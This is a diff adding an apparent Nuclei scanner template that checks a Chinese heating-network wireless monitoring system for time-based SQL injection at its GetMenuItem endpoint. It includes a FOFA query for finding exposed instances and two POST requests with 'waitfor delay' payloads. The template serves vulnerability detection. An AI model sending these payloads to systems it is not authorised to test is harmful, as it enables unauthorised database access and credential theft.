@@ -1,0 +1,45 @@
+id: rewangwuxian-GetMenuItem-sql
+
+info:
+  name: "热网无线监测系统 GetMenuItem 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+      热网无线监测系统在 /DataSrvs/UCCGSrv.asmx/GetMenuItem 接口处存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息获取，包括但不限于管理员凭证、用户数据等。在特定权限条件下，该漏洞可能被进一步利用实现服务器端恶意代码写入，最终导致系统控制权丧失。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487275&idx=1&sn=c134372400af3922ff7db552556b2160&chksm=c267ba18f510330e6d48b24d1d1a3f6c11eccf22bb721ba521852e61acd140290897ea95d29b&token=2053938247&lang=zh_CN#rd
+  tags: 热网无线监测系统
+
+
+
+http:
+- raw:
+  - |
+    POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+    Content-Type: application/x-www-form-urlencoded
+
+    name=1') waitfor delay '0:0:4'-- +
+  - |
+    POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+    Content-Type: application/x-www-form-urlencoded
+
+    name=1') waitfor delay '0:0:8'-- +
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
